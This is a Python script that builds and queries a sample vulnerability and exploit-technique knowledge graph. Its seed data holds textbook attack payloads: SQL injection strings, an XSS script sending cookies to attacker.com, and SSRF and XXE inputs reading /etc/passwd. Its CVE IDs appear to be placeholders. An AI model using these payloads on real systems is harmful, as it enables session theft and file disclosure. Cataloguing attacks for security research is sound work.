import os
import json
import argparse
from pathlib import Path
import sys
from typing import Dict, Any, List, Optional

# Try to import the database setup function
try:
    from data.vulnerability_db.setup_db import create_vulnerability_db
except ImportError:
    print("Could not import database setup. Make sure you're running from the project root.")
    exit(1)

def create_sample_data():
    """
    Creates comprehensive sample vulnerability and exploit data files for the knowledge graph
    
    This function generates sample data files for vulnerabilities and exploit techniques
    that will be loaded into the FalkorDB GraphRAG database. The data is structured
    to enable effective querying and knowledge retrieval by the agents.
    """
    data_dir = Path("data/vulnerability_db")
    data_dir.mkdir(parents=True, exist_ok=True)
    
    # Sample vulnerability data with comprehensive details
    vuln_data = [
        {
            "name": "SQL Injection",
            "cve_id": "CVE-2023-1234",
            "description": "SQL injection vulnerability in login form allows attackers to bypass authentication by manipulating input parameters to alter the SQL query logic.",
            "severity": "High",
            "affected_components": "Authentication system, Database interface",
            "attack_vectors": "Web forms, API parameters, URL query strings",
            "impact": "Authentication bypass, data exfiltration, data manipulation"
        },
        {
            "name": "Cross-Site Scripting (XSS)",
            "cve_id": "CVE-2023-5678",
            "description": "Reflected XSS vulnerability in search function allows attackers to execute arbitrary JavaScript in users' browsers by embedding malicious code in search parameters.",
            "severity": "Medium",
            "affected_components": "Search functionality, Output rendering",
            "attack_vectors": "URL parameters, form inputs, user profiles",
            "impact": "Session hijacking, credential theft, user impersonation"
        },
        {
            "name": "Server-Side Request Forgery (SSRF)",
            "cve_id": "CVE-2023-9012",
            "description": "SSRF vulnerability in URL validation allows attackers to make internal network requests, accessing resources that should be restricted to the server.",
            "severity": "High",
            "affected_components": "URL processing, External resource fetcher",
            "attack_vectors": "URL inputs, API endpoints, webhook configurations",
            "impact": "Internal network scanning, access to internal services, data exfiltration"
        },
        {
            "name": "Insecure Direct Object Reference (IDOR)",
            "cve_id": "CVE-2023-3456",
            "description": "IDOR vulnerability allows unauthorized access to user data by manipulating resource identifiers in API requests, bypassing access controls.",
            "severity": "Medium",
            "affected_components": "API endpoints, Access control system",
            "attack_vectors": "API parameters, resource IDs, URL paths",
            "impact": "Unauthorized data access, privacy violations, data theft"
        },
        {
            "name": "Remote Code Execution (RCE)",
            "cve_id": "CVE-2023-7890",
            "description": "RCE vulnerability in file upload functionality allows attackers to execute arbitrary code by uploading malicious files that bypass validation checks.",
            "severity": "Critical",
            "affected_components": "File upload system, File processor",
            "attack_vectors": "Malicious file uploads, command injection",
            "impact": "Full system compromise, data theft, service disruption"
        },
        {
            "name": "XML External Entity (XXE) Injection",
            "cve_id": "CVE-2023-2345",
            "description": "XXE vulnerability in XML parser allows attackers to read arbitrary files or perform server-side request forgery by exploiting external entity processing.",
            "severity": "High",
            "affected_components": "XML parser, Document processor",
            "attack_vectors": "XML input fields, API requests, file uploads",
            "impact": "Local file disclosure, internal network scanning, denial of service"
        },
        {
            "name": "Cross-Site Request Forgery (CSRF)",
            "cve_id": "CVE-2023-6789",
            "description": "CSRF vulnerability allows attackers to trick users into performing unwanted actions on an authenticated application by crafting malicious requests.",
            "severity": "Medium",
            "affected_components": "Form submission, State-changing operations",
            "attack_vectors": "Malicious websites, phishing emails",
            "impact": "Unauthorized actions, account modification, privilege escalation"
        },
        {
            "name": "Broken Authentication",
            "cve_id": "CVE-2023-8901",
            "description": "Broken authentication mechanisms allow attackers to compromise passwords, session tokens, or exploit implementation flaws to assume users' identities.",
            "severity": "Critical",
            "affected_components": "Login system, Session management",
            "attack_vectors": "Credential stuffing, session fixation, brute force",
            "impact": "Account takeover, identity theft, data breach"
        }
    ]
    
    # Sample exploit technique data with detailed information
    exploit_data = [
        {
            "name": "Boolean-based Blind SQL Injection",
            "description": "Technique that uses boolean operations (AND, OR) to extract data when no error messages are available, by observing differences in application behavior based on true/false conditions.",
            "target_tech": "SQL Databases",
            "difficulty": "Medium",
            "detection_methods": "Web application firewalls, input validation",
            "example_payload": "' OR 1=1 -- ",
            "applicable_to": ["MySQL", "PostgreSQL", "Oracle", "MSSQL"],
            "tools": ["SQLmap", "Burp Suite", "OWASP ZAP"]
        },
        {
            "name": "Time-based Blind SQL Injection",
            "description": "Technique that uses time delays to extract data when no output is visible. It observes differences in response times to infer information about the database.",
            "target_tech": "SQL Databases",
            "difficulty": "Hard",
            "detection_methods": "Response time monitoring, prepared statements",
            "example_payload": "'; IF (1=1) WAITFOR DELAY '0:0:5' --",
            "applicable_to": ["MySQL", "PostgreSQL", "Oracle", "MSSQL"],
            "tools": ["SQLmap", "Burp Suite", "OWASP ZAP"]
        },
        {
            "name": "Stored XSS Attack",
            "description": "Technique where malicious script is stored on the target server (in a database, message forum, comment field, etc.) and executed when users access the stored data.",
            "target_tech": "Web Applications",
            "difficulty": "Medium",
            "detection_methods": "Content Security Policy, output encoding",
            "example_payload": "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
            "applicable_to": ["Web forms", "User profiles", "Comment systems"],
            "tools": ["Burp Suite", "XSStrike", "BeEF"]
        },
        {
            "name": "DOM-based XSS Attack",
            "description": "Technique that exploits vulnerabilities in client-side JavaScript to execute malicious code by manipulating the DOM environment in the victim's browser.",
            "target_tech": "Web Browsers",
            "difficulty": "Hard",
            "detection_methods": "Content Security Policy, input sanitization",
            "example_payload": "location.hash.substring(1) injected into innerHTML",
            "applicable_to": ["Single-page applications", "JavaScript heavy apps"],
            "tools": ["DOM Invader", "XSSwagger", "Retire.js"]
        },
        {
            "name": "HTTP Parameter Pollution",
            "description": "Technique that manipulates HTTP parameters to bypass security controls or cause unexpected behavior by sending multiple parameters with the same name.",
            "target_tech": "Web Applications",
            "difficulty": "Medium",
            "detection_methods": "Parameter validation, WAF rules",
            "example_payload": "?id=valid&id=malicious",
            "applicable_to": ["Web forms", "API endpoints", "URL parameters"],
            "tools": ["Burp Suite", "OWASP ZAP", "Custom scripts"]
        },
        {
            "name": "SSRF via URL Schema Bypass",
            "description": "Technique that exploits SSRF vulnerabilities by using alternative URL schemes or protocols to bypass filters and access internal resources.",
            "target_tech": "Web Services",
            "difficulty": "Medium",
            "detection_methods": "Allowlist validation, network segmentation",
            "example_payload": "http://localhost:8080/admin or file:///etc/passwd",
            "applicable_to": ["URL input fields", "API integrations", "Webhook configurations"],
            "tools": ["Burp Suite", "SSRFmap", "Gopherus"]
        },
        {
            "name": "PHP Object Injection",
            "description": "Technique that exploits PHP's unserialize() function to inject malicious objects that can lead to code execution when the application deserializes them.",
            "target_tech": "PHP Applications",
            "difficulty": "Hard",
            "detection_methods": "Input validation, secure deserialization",
            "example_payload": "O:8:\"Example\":1:{s:5:\"value\";s:4:\"data\";}",
            "applicable_to": ["PHP web applications", "Cookie values", "Form fields"],
            "tools": ["PHPGGC", "Burp Suite", "Custom scripts"]
        },
        {
            "name": "XML External Entity (XXE) Injection",
            "description": "Technique that exploits XML parsers to process external entity references, allowing attackers to access local files or perform SSRF attacks.",
            "target_tech": "XML Processors",
            "difficulty": "Medium",
            "detection_methods": "Disable DTD processing, input validation",
            "example_payload": "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
            "applicable_to": ["XML APIs", "SOAP web services", "Document uploaders"],
            "tools": ["XXEinjector", "Burp Suite", "OWASP ZAP"]
        }
    ]
    
    # Relationship data connecting vulnerabilities to applicable exploit techniques
    relationships = [
        {"vulnerability": "SQL Injection", "exploited_by": ["Boolean-based Blind SQL Injection", "Time-based Blind SQL Injection"]},
        {"vulnerability": "Cross-Site Scripting (XSS)", "exploited_by": ["Stored XSS Attack", "DOM-based XSS Attack"]},
        {"vulnerability": "Server-Side Request Forgery (SSRF)", "exploited_by": ["SSRF via URL Schema Bypass", "HTTP Parameter Pollution"]},
        {"vulnerability": "XML External Entity (XXE) Injection", "exploited_by": ["XML External Entity (XXE) Injection"]},
        {"vulnerability": "Remote Code Execution (RCE)", "exploited_by": ["PHP Object Injection"]}
    ]
    
    # Write data to files
    vuln_file = data_dir / "vulnerabilities.jsonl"
    exploit_file = data_dir / "exploit_techniques.jsonl"
    relationship_file = data_dir / "relationships.jsonl"
    
    if not vuln_file.exists():
        with open(vuln_file, 'w') as f:
            for item in vuln_data:
                f.write(json.dumps(item) + '\n')
        print(f"Created sample vulnerability data in {vuln_file}")
    
    if not exploit_file.exists():
        with open(exploit_file, 'w') as f:
            for item in exploit_data:
                f.write(json.dumps(item) + '\n')
        print(f"Created sample exploit technique data in {exploit_file}")
    
    if not relationship_file.exists():
        with open(relationship_file, 'w') as f:
            for item in relationships:
                f.write(json.dumps(item) + '\n')
        print(f"Created sample relationship data in {relationship_file}")
        
    return {
        "vulnerabilities": len(vuln_data),
        "exploit_techniques": len(exploit_data),
        "relationships": len(relationships)
    }

def perform_sample_queries(query_engine, query_type="all"):
    """
    Performs sample queries to test the knowledge graph functionality
    
    Args:
        query_engine: The FalkorGraphQueryEngine to query
        query_type: Type of queries to perform (all, graph, nl, specific)
        
    Returns:
        Dictionary with query results
    """
    results = {}
    
    # Example graph queries (using Cypher)
    if query_type in ["all", "graph"]:
        print("\n=== Testing Graph Queries ===\n")
        
        # Query for SQL injection vulnerabilities
        print("Querying for SQL injection vulnerabilities:")
        sql_inj_query = 'MATCH (v:Vulnerability) WHERE v.name CONTAINS "SQL" RETURN v.name, v.severity, v.description'
        result = query_engine.graph_query(sql_inj_query)
        print(result)
        results["sql_injection"] = result
        
        # Query for high severity vulnerabilities
        print("\nQuerying for high severity vulnerabilities:")
        high_sev_query = 'MATCH (v:Vulnerability) WHERE v.severity = "High" RETURN v.name, v.cve_id'
        result = query_engine.graph_query(high_sev_query)
        print(result)
        results["high_severity"] = result
        
        # Query for exploit techniques related to web applications
        print("\nQuerying for web application exploit techniques:")
        web_exploit_query = 'MATCH (e:ExploitTechnique) WHERE e.target_tech CONTAINS "Web" RETURN e.name, e.description'
        result = query_engine.graph_query(web_exploit_query)
        print(result)
        results["web_exploits"] = result
        
        # Query for relationships between vulnerabilities and exploit techniques
        print("\nQuerying for vulnerability-exploit relationships:")
        relationship_query = 'MATCH (v:Vulnerability)-[r:EXPLOITED_BY]->(e:ExploitTechnique) RETURN v.name, e.name, e.difficulty'
        try:
            result = query_engine.graph_query(relationship_query)
            print(result)
            results["relationships"] = result
        except Exception as e:
            print(f"Error running relationship query: {e}")
            results["relationships"] = f"Error: {e}"
    
    # Example natural language queries (RAG)
    if query_type in ["all", "nl"]:
        print("\n=== Testing Natural Language Queries ===\n")
        
        # Test natural language queries
        nl_queries = [
            "What are the techniques for exploiting SQL injection vulnerabilities?",
            "How can I exploit XSS vulnerabilities?",
            "What are the most severe vulnerabilities in the database?",
            "What tools can be used for SSRF attacks?",
            "How can I detect and prevent XXE attacks?"
        ]
        
        results["nl_queries"] = {}
        for query in nl_queries:
            print(f"\nQuery: {query}")
            try:
                result = query_engine.query(query)
                print(f"Result: {result}")
                results["nl_queries"][query] = result
            except Exception as e:
                print(f"Error: {e}")
                results["nl_queries"][query] = f"Error: {e}"
    
    # Specific vulnerability query
    if query_type in ["all", "specific"]:
        print("\n=== Testing Specific Vulnerability Queries ===\n")
        
        vulnerabilities = ["SQL Injection", "Cross-Site Scripting", "SSRF"]
        results["specific"] = {}
        
        for vuln in vulnerabilities:
            print(f"\nQuerying details for: {vuln}")
            try:
                # Graph query for specific vulnerability
                vuln_query = f'MATCH (v:Vulnerability) WHERE v.name CONTAINS "{vuln}" RETURN v'
                graph_result = query_engine.graph_query(vuln_query)
                
                # Natural language query for exploitation techniques
                nl_result = query_engine.query(f"How can I exploit {vuln} vulnerabilities?")
                
                results["specific"][vuln] = {
                    "graph_result": graph_result,
                    "nl_result": nl_result
                }
                
                print(f"Graph result: {graph_result}")
                print(f"NL result: {nl_result}")
            except Exception as e:
                print(f"Error querying {vuln}: {e}")
                results["specific"][vuln] = f"Error: {e}"
    
    return results

def list_database_contents(query_engine):
    """
    Lists all contents of the knowledge graph database
    
    Args:
        query_engine: The FalkorGraphQueryEngine to query
        
    Returns:
        Dictionary with database statistics and content samples
    """
    print("\n=== Database Contents ===\n")
    
    stats = {}
    
    try:
        # Count nodes by type
        vuln_count_query = 'MATCH (v:Vulnerability) RETURN count(v) as count'
        exploit_count_query = 'MATCH (e:ExploitTechnique) RETURN count(e) as count'
        rel_count_query = 'MATCH ()-[r:EXPLOITED_BY]->() RETURN count(r) as count'
        
        stats["vulnerability_count"] = query_engine.graph_query(vuln_count_query)[0]["count"]
        stats["exploit_technique_count"] = query_engine.graph_query(exploit_count_query)[0]["count"]
        try:
            stats["relationship_count"] = query_engine.graph_query(rel_count_query)[0]["count"]
        except:
            stats["relationship_count"] = "Error: Could not count relationships"
        
        print(f"Vulnerabilities: {stats['vulnerability_count']}")
        print(f"Exploit Techniques: {stats['exploit_technique_count']}")
        print(f"Relationships: {stats['relationship_count']}")
        
        # Sample data for each type
        print("\n--- Sample Vulnerabilities ---")
        sample_vuln_query = 'MATCH (v:Vulnerability) RETURN v LIMIT 3'
        sample_vulns = query_engine.graph_query(sample_vuln_query)
        for i, vuln in enumerate(sample_vulns):
            print(f"\nVulnerability {i+1}:")
            print(json.dumps(vuln["v"], indent=2))
        
        print("\n--- Sample Exploit Techniques ---")
        sample_exploit_query = 'MATCH (e:ExploitTechnique) RETURN e LIMIT 3'
        sample_exploits = query_engine.graph_query(sample_exploit_query)
        for i, exploit in enumerate(sample_exploits):
            print(f"\nExploit Technique {i+1}:")
            print(json.dumps(exploit["e"], indent=2))
        
        # Include samples in stats
        stats["sample_vulnerabilities"] = sample_vulns
        stats["sample_exploit_techniques"] = sample_exploits
        
        return stats
    
    except Exception as e:
        print(f"Error listing database contents: {e}")
        return {"error": str(e)}

def inspect_database():
    """
    Initializes and comprehensively inspects the database
    
    This function creates sample data, initializes the database,
    and performs various tests to ensure it's working correctly.
    """
    print("=== Vulnerability Knowledge Graph Database Inspection ===\n")
    
    try:
        # Create sample data files if they don't exist
        print("Checking sample data...")
        data_stats = create_sample_data()
        print(f"Sample data ready: {data_stats['vulnerabilities']} vulnerabilities, "
              f"{data_stats['exploit_techniques']} exploit techniques, "
              f"{data_stats['relationships']} relationships\n")
        
        # Initialize the database
        print("Initializing vulnerability database...")
        query_engine = create_vulnerability_db(load_data=True)
        print("Database initialized successfully\n")
        
        # List database contents
        db_stats = list_database_contents(query_engine)
        
        # Perform sample queries to test functionality
        print("\nTesting database queries...")
        query_results = perform_sample_queries(query_engine)
        
        print("\nDatabase inspection completed successfully")
        return {
            "data_stats": data_stats,
            "db_stats": db_stats,
            "query_results": query_results
        }
    
    except Exception as e:
        print(f"Error during database inspection: {e}")
        return {"error": str(e)}

def main():
    """Main function for database inspection utility"""
    parser = argparse.ArgumentParser(description="Inspect and test the vulnerability knowledge graph database")
    parser.add_argument('--init-only', action='store_true', help="Only initialize sample data without testing queries")
    parser.add_argument('--query-type', choices=['all', 'graph', 'nl', 'specific'], default='all',
                       help="Type of queries to perform (default: all)")
    parser.add_argument('--list', action='store_true', help="List database contents")
    parser.add_argument('--output', help="Output file for inspection results (JSON)")
    
    args = parser.parse_args()
    
    results = {}
    
    if args.init_only:
        results["data_stats"] = create_sample_data()
    elif args.list:
        query_engine = create_vulnerability_db(load_data=False)
        results["db_stats"] = list_database_contents(query_engine)
    else:
        results = inspect_database()
    
    # Save results if output file specified
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\nResults saved to {args.output}")

if __name__ == "__main__":
    main()